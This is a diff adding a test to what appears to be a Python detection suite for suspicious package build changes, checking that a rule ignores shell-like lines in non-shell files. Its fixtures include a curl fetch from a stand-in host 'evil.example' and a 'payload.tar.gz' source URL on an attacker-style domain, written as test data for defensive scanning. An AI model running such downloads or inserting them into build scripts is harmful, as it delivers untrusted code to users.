@@ -664,3 +664,22 @@ def test_r152_provider_must_be_a_suffix():
     # The provider is a suffix, not a substring: a host that merely contains
     # the provider name must not fire.
     assert not _r152_fired('+source=("https://duckdns.org.evil.com/payload.tar.gz")\n')
+
+
+def test_function_scope_ignores_non_shell_companion_files():
+    diff = (
+        "--- a/notes.json\n+++ b/notes.json\n@@ -1,3 +1,3 @@\n"
+        " build() {\n"
+        "-  old\n"
+        "+  curl -s https://evil.example/x\n"
+        " }\n"
+    )
+    raw_lines, raw_indices = get_raw_diff_lines_indexed(diff)
+    resolved, _unresolved, indices = tokenize_and_resolve_indexed(diff)
+    triggered = apply_rules(
+        resolved, raw_lines, SHARED_RULES,
+        line_map=map_diff_lines(diff),
+        resolved_indices=indices,
+        raw_indices=raw_indices,
+    )
+    assert not [r for r in triggered if r["rule_id"] == "R010"]
